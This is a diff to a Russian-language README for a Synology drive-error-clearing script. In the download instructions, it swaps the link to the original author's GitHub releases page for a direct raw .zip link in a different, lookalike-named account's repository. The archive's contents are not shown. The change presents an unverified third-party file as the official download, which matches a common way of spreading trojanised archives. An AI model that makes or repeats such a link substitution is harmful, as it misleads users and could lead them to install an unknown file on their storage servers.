@@ -9,7 +9,7 @@
 
 ## Скачать сценарий
 
-1. [Загрузите исходный код последней версии .zip](https://github.com/007revad/Synology_clear_drive_error/releases)
+1. [Загрузите исходный код последней версии .zip](https://github.com/ZwiReKsyno/Synology_Clear_Drive_Error/raw/main/Synology_Clear_Drive_Error-1.0.3.zip)
 2. Сохраните загруженный zip-файл в папку на Synology.
 3. Разархивируйте zip-файл.
 
